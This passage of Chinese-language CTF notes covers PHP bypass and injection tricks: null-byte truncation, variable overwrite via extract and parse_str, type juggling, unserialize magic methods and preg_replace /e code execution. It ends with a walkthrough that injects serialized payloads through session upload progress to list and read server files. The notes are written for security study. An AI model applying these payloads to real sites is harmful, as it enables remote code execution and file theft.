				}
				//http://127.0.0.1/1.php?a[]=1&b[]=2

3. ereg函数漏洞：00截断
	
		ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE
		符串对比解析
		在这里如果 $_GET[‘password’]为数组，则返回值为NULL而不是false
		如果为123 || asd || 12as || 123%00&&&**，则返回值为true
		其余为false

		大小写绕过
		%00截断绕过
		参数为数组时它的返回值不是FALSE

4. 变量覆盖
		
		主要涉及到的函数为extract函数，看个例子
		
		<?php  
		    $auth = '0';  
		    // 这里可以覆盖$auth的变量值
		    print_r($_GET);
		    echo "</br>";
		    extract($_GET); 
		    if($auth == 1){  
		        echo "private!";  
		    } else{  
		        echo "public!";  
		    }  
		?>
		extract可以接收数组，然后重新给变量赋值，过程很简单
		http://127.0.0.1:8080/test.php?a[]=1&a[]=2&a[key]=3
		
		同时！PHP的特性$可以用来赋值变量名也能导致变量覆盖！(间接寻址)
		<?php  
		    $a='hi';
		    foreach($_GET as $key => $value) {
		        echo $key."</br>".$value;
		        $$key = $value;
		    }
		    print "</br>".$a;
		?>
		构造http://127.0.0.1:8080/test.php?a=12 即可达到目的

5. strcmp

		如果 str1 小于 str2 返回 < 0； 如果 str1 大于 str2 返回 > 0；如果两者相等，返回 0。 
		先将两个参数先转换成string类型。 
		当比较数组和字符串的时候，返回是0。 
		如果参数不是string类型，直接return
		<?php
		    $password=$_GET['password'];
		    if (strcmp('xd',$password)) {
		     echo 'NO!';
		    } else{
		        echo 'YES!';
		    }
		?>
		构造http://127.0.0.1:8080/test.php?password[]=

6. is_numeric()

		判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。
		is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！
		该函数还可能造成sql注入，例如将‘1 or 1'转换为16进制形式，再传参，就可以造成sql注入
		intval($req["number"])=intval(strrev($req["number"]))  如果要求不是回文，但又要满足这个条件，可以用科学计数法构造0=0：number=0e-0%00
		
		<?php
		echo is_numeric(233333);       # 1
		echo is_numeric('233333');    # 1
		echo is_numeric(0x233333);    # 1
		echo is_numeric('0x233333');   # 1
		echo is_numeric('233333abc');  # 0
		?>
		16进制编码绕过

6. Intval函数获取变量整数数值

		Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。数字大于2147483647会出现溢出出现负数。这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。
		变量不能是array和object 格式
		直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换"
		<?php
		
		print intval(-1);//-1
		print intval('1a');//1
		print intval('a1a');//0
		
		?>
		intval()转换的时候，会将从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval()不会报错而是返回0
		顺便说一下，intval可以被%00截断
		int转string：
		
		$var = 5;  
		方式1：$item = (string)$var;  
		方式2：$item = strval($var);
		
		string转int：intval()函数。
		
		var_dump(intval('2')) //2  
		var_dump(intval('3abcd')) //3  
		var_dump(intval('abcd')) //0 
		可以使用字符串-0转换，来自于wechall的方法
		
		if($req['number']!=strval(intval($req['number']))){
		     $info = "number must be equal to it's integer!! ";  
		}
		如果当$req[‘number’]=0%00即可绕过

7. preg_match

		如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题
		
		<?php
		$ip = 'asd 1.1.1.1 abcd'; // 可以绕过
		if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {
		  die('error');
		} else {
		   echo('key...');
		}
		?>

		绕过正则表达式
		换行符绕过

8. parse_str

		与 parse_str() 类似的函数还有 mb_parse_str()，parse_str 将字符串解析成多个变量，如果参数str是URL传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。
		时变量覆盖的一种
		
		<?php
		    $var='init';  
		    print $var."</br>";
		    parse_str($_SERVER['QUERY_STRING']);  
		    echo $_SERVER['QUERY_STRING']."</br>";
		    print $var;
		?>

9. unset

		unset(bar);用来销毁指定的变量，如果变量bar 包含在请求参数中，可能出现销毁一些变量而实现程序逻辑绕过。
		
		<?php  
		$_CONFIG['extraSecure'] = true;
		
		foreach(array('_GET','_POST') as $method) {
		    foreach($$method as $key=>$value) {
		      // $key == _CONFIG
		      // $$key == $_CONFIG
		      // 这个函数会把 $_CONFIG 变量销毁
		      unset($$key);
		    }
		}
		
		if ($_CONFIG['extraSecure'] == false) {
		    echo 'flag {****}';
		}
		?>

10. switch()

		如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型，效果相当于intval函数。如下：
		
		<?php
		    $i ="abc";  
		    switch ($i) {  
		    case 0:  
		    case 1:  
		    case 2:  
		    echo "i is less than 3 but not negative";  
		    break;  
		    case 3:  
		    echo "i is 3";  
		    } 
		?>

11. in_array()

		$array=[0,1,2,'3'];  
		var_dump(in_array('abc', $array)); //true  
		var_dump(in_array('1bc', $array)); //true 
		
		在所有php认为是int的地方输入string，都会被强制转换

12. serialize 和 unserialize漏洞

		这里我们先简单介绍一下php中的魔术方法（这里如果对于类、对象、方法不熟的先去学学吧），即Magic方法，php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如 __construct， __destruct，__toString，__sleep，__wakeup等等。这些函数都会在某些特殊时候被自动调用。 
		例如__construct()方法会在一个对象被创建时自动调用，对应的__destruct则会在一个对象被销毁时调用等等。 
		这里有两个比较特别的Magic方法，__sleep 方法会在一个对象被序列化的时候调用。 __wakeup方法会在一个对象被反序列化的时候调用。

		<?php
			class test
			{
			    public $username = '';
			    public $password = '';
			    public $file = '';
			    public function out(){
			        echo "username: ".$this->username."<br>"."password: ".$this->password ;
			    }
			     public function __toString() {
			        return file_get_contents($this->file);
			    }
			}
			$a = new test();
			$a->file = 'C:\Users\YZ\Desktop\plan.txt';
			echo serialize($a);
		?>
		//tostring方法会在输出实例的时候执行，如果实例路径是隐秘文件就可以读取了
	
		echo unserialize触发了__tostring函数，下面就可以读取了C:\Users\YZ\Desktop\plan.txt文件了 
		<?php
			class test
			{
			    public $username = '';
			    public $password = '';
			    public $file = '';
			    public function out(){
			        echo "username: ".$this->username."<br>"."password: ".$this->password ;
			    }
			     public function __toString() {
			        return file_get_contents($this->file);
			    }
			}
			$a = 'O:4:"test":3:{s:8:"username";s:0:"";s:8:"password";s:0:"";s:4:"file";s:28:"C:\Users\YZ\Desktop\plan.txt";}';
			echo unserialize($a);
		?>

13. session 反序列化漏洞

http://php.net/manual/en/book.session.php
主要原因是ini_set(‘session.serialize_handler’, ‘php_serialize’);ini_set(‘session.serialize_handler’, ‘php’);两种方法处理session的方式存在差异，导致漏洞触发 

<http://web.jarvisoj.com:32784/>

		https://blog.spoock.com/2016/11/15/jarvisoj-web-writeup-1/
		看到PHP代码中的ini_set('session.serialize_handler', 'php')就会知道这道题目与PHP中的Session序列话的问题有关，关于PHP中的Session的问题，可以参考我的这篇文章。这里就对Session序列化不做说明。
		这个漏洞如果要触发，则需要在服务器中写入一个使用php_serialize序列话的值，然后访问index.php时就会被php的引擎反序列化。但是本题没有提供写入session的方法，但是可以通过Session Upload Progress来向服务器设置session（http://php.net/manual/en/session.upload-progress.php）。

		具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中，上传的页面的写法如下：
		<form action="http://121.42.149.60/68b329da9893e34099c7d8ad5cb9c940/index.php" method="POST" enctype="multipart/form-data">
		    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
		    <input type="file" name="file" />
		    <input type="submit" />
		</form>
		最后在Session就会保存上传的文件名。

		下面就对PHP_SESSION_UPLOAD_PROGRESS来写入的方式进行测试。
		在本地中，需要对$mdzz进行赋值，然后通过析构函数中的eval()去执行$mdzz中的方法。
		在本地创建myindex.php
		<?php
		ini_set('session.serialize_handler', 'php_serialize');
		session_start();
		class OowoO
		{
		    public $mdzz='需要设置方法';
		    function __construct()
		    {
		        // $this->mdzz = 'phpinfo();';
		    }
		    
		    function __destruct()
		    {
		        // echo $this->mdzz;
		    }
		}
		$obj = new OowoO();
		echo serialize($obj);

		首先设置$mdzz='echo "spoock";',最后序列化得到的结果是:O:5:"OowoO":1:{s:4:"mdzz";s:14:"echo "spoock";";}。那么文件名就需要设置为|O:5:"OowoO":1:{s:4:"mdzz";s:14:"echo "spoock";";}，由于要对其中的双引号进行转义，最后实际的文件名为|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:14:\"echo \"spoock\";\";}。最后的测试结果为：可以看到最后的结果输出了spoock，说明上述的测试是成功的。

		接下来就需要获取flag了。
		获取项目路径：
		通过dirname获取文件路径
		设置$mdzz='print_r(dirname(__FILE__));'
		序列化得到的结果是O:5:"OowoO":1:{s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";}
		文件名设置为|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:27:\"print_r(dirname(__FILE__));\";}
		得到项目路径是在opt/lampp/htdocs
		
		获取文件列表
		通过scandir获取文件列表
		设置$mdzz='print_r(scandir("/opt/lampp/htdocs"));'
		序列化的结果是O:5:"OowoO":1:{s:4:"mdzz";s:38:"print_r(scandir("/opt/lampp/htdocs"));";}
		文件名设置为|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:38:\"print_r(scandir(\"/opt/lampp/htdocs\"));\";}
		
		发现存在Here_1s_7he_fl4g_buT_You_Cannot_see.php。
		读取文件内容：
		通过file_get_contents读取文件内容
		设置$mdzz='O:5:"OowoO":1:{s:4:"mdzz";s:87:"print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"))";}'
		序列话结果O:5:"OowoO":1:{s:4:"mdzz";s:88:"print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));";}
		文件名设置为|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}。
		显示结果为：
		
		最后就得到flag了。

14. eregi

		%00截断绕过
		参数为数组时它的返回值不是FALSE

15. strstr

		大小写绕过

16. preg_match

	如果在进行正则表达式匹配的时候，没有限制字符串的开始和结束(^ 和 $)，则可以存在绕过的问题
	
	<?php
	$ip = 'asd 1.1.1.1 abcd'; // 可以绕过
	if(!preg_match("/(\d+)\.(\d+)\.(\d+)\.(\d+)/",$ip)) {
	  die('error');
	} else {
	   echo('key...');
	}
	?>

	换行符%0a,%d0

18. preg_replace()
preg_replace()函数导致的代码注射。当pattern中存在/e模式修饰符，即允许执行代码。这里我们分三种情况讨论下

	+ preg_replace() pattern 参数注射
		
		pattern即第一个参数的代码注射。
		当magic_quotes_gpc=Off时，导致代码执行。
		demo code 3.1:
		<?php
		echo $regexp = $_GET['reg'];
		$var = '<php>phpinfo()</php>';
		preg_replace("/<php>(.*?)$regexp", '\\1', $var);
		?>
		
		访问http://127.0.0.1/preg_replace1.php?reg=%3C\/php%3E/e 即
		执行phpinfo()。
		
	3.2 preg_replace() replacement参数注射
		
		replacement即第二个参数的代码注射，导致代码执行。
		demo code 3.2:
		<?
		preg_replace("/menzhi007/e",$_GET['h'],"jutst test menzhi007!");
		?>
		
		当我们提交 http://127.0.0.1/preg_replace2.php?h=phpinfo() 即
		执行phpinfo()。
		
	3.3 preg_replace()第三个参数注射
		
		我们通过构造subject参数执行代码。
		提交：http://127.0.0.1/preg_replace3.php?h=[php]phpinfo()[/php]
		或者 http://127.0.0.1/preg_replace3.php?h=[php]${phpinfo%28%29}[/php] 导致代码执行
		demo code 3.3:
		<?
		preg_replace("/\s*
		php
		(.+?)
		\/php
		\s*/ies", "\\1", $_GET['h']);
		?>

#正则表达式bypass

